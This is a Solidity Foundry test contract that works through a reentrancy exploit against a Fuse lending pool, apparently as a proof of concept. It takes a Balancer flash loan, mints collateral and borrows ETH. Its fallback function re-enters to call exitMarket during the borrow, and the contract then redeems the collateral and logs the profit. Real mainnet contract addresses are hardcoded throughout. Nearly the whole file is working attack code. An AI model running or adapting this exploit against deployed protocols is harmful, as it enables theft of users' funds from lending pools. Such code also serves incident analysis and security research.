// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

import {IBalancer} from "./interfaces/IBalancer.sol";
import {IFusePool, IFusePoolEth} from "./interfaces/IFusePool.sol";
import {IComptroller} from "./interfaces/IComptroller.sol";
import {IFlashLoanRecipient} from "./interfaces/IFlashLoanRecipient.sol";
import {IERC20} from "./interfaces/IERC20.sol";
import {IWETH} from "./interfaces/IWETH.sol";
import {IFuseLens} from "./interfaces/IFuseLens.sol";

contract FuseProtocolExploit is IFlashLoanRecipient, Test {
    address constant BALANCER_VAULT =
        0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    address constant WSTETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant fWSTETH_146 = 0x49dA42a1EcA4AC6cA0C6943d9E5dc64e4641e0E3;
    address constant fWETH_146 = 0xfbD8Aaf46Ab3C2732FA930e5B343cd67cEA5054C;
    address constant COMPTTROLLER = 0x88F7c23EA6C4C404dA463Bc9aE03b012B32DEf9e;
    address constant FUSE_LENS = 0x6Dc585Ad66A10214Ef0502492B0CC02F0e836eec;

    uint256 counter;

    constructor() {
        IERC20(WSTETH).approve(fWSTETH_146, type(uint256).max);
        IERC20(fWSTETH_146).approve(fWSTETH_146, type(uint256).max);
        IERC20(fWETH_146).approve(fWETH_146, type(uint256).max);
        IERC20(WETH).approve(WETH, type(uint256).max);
        counter = 0;
    }

    function exploit() external {
        takeFlashLoanFromBalancer();
    }

    function takeFlashLoanFromBalancer() internal {
        IERC20[] memory tokens = new IERC20[](2);
        tokens[0] = IERC20(WSTETH);
        tokens[1] = IERC20(WETH);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 80000e18;
        amounts[1] = 50000e18;
        IBalancer(BALANCER_VAULT).flashLoan(
            IFlashLoanRecipient(address(this)),
            tokens,
            amounts,
            new bytes(0)
        );
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        // =====================================================================

        console.log(
            "------------------------Before----------------------------"
        );
        console.log("ETH balance", address(this).balance);
        console.log("WETH balace", IERC20(WETH).balanceOf(address(this)));
        console.log("WSTWETH balace", IERC20(WSTETH).balanceOf(address(this)));
        console.log("fWETH balace", IERC20(fWETH_146).balanceOf(address(this)));
        console.log(
            "fWSTETH balace",
            IERC20(fWSTETH_146).balanceOf(address(this))
        );
        console.log("----------------------------------------------------");

        // =====================================================================

        // Enter market for wstEth
        address[] memory fTokens = new address[](1);
        fTokens[0] = fWSTETH_146;
        IComptroller(COMPTTROLLER).enterMarkets(fTokens);
        // Mint & receive fWSTETH
        IFusePool(fWSTETH_146).mint(IERC20(WSTETH).balanceOf(address(this)));
        // Borrow ETH & execute Re-entrancy
        IFusePool(fWETH_146).borrow(2392401126398370465747);
        IFusePool(fWSTETH_146).redeemUnderlying(80000000000000000000000);

        // // Unwrap Weth
        // counter = 1;
        // IWETH(WETH).withdraw(50000e18);

        // // Enter market for wEth
        // address[] memory fTokensWeth = new address[](1);
        // fTokensWeth[0] = fWETH_146;
        // IComptroller(COMPTTROLLER).enterMarkets(fTokensWeth);

        // (bool success, bytes memory ret) = fWETH_146.call{value: 50000 ether}(
        //     abi.encodeWithSelector(bytes4(0x1249c58b))
        // );

        // counter = 0;
        // IFusePool(fWETH_146).borrow(2392401126398370465747);
        // IFusePool(fWSTETH_146).mint(IERC20(WSTETH).balanceOf(address(this)));
        // IFusePool(fWSTETH_146).redeemUnderlying(80000000000000000000000);

        // counter = 2;
        // IFusePool(fWETH_146).borrow(50000 ether);   

        IERC20(WSTETH).transfer(BALANCER_VAULT, 80000000000000000000000);
        IERC20(WETH).transfer(BALANCER_VAULT, 50000000000000000000000);

        // =====================================================================

        console.log(
            "--------------------Profit--------------------------------"
        );
        console.log("ETH balance", address(this).balance);
        // =====================================================================
    }

    fallback() external payable {
        console.log("counter", counter);
        if (counter == 0) {
            // When borrowed 2300 Eth
            IComptroller(COMPTTROLLER).exitMarket(fWSTETH_146);
            console.log("Fallback: Borrowed 2397 Eth & called exitMarket()");
        }
        if (counter == 1) {
            // Unwrap Eth
            console.log("Fallback: Unwrap Eth", address(this).balance);
        }
        if (counter == 2) {
            // When borrowed 50K Eth
            IComptroller(COMPTTROLLER).exitMarket(fWETH_146);
            console.log("Fallback: Borrowed 50k Eth & called exitMarket()");
        }
    }
}
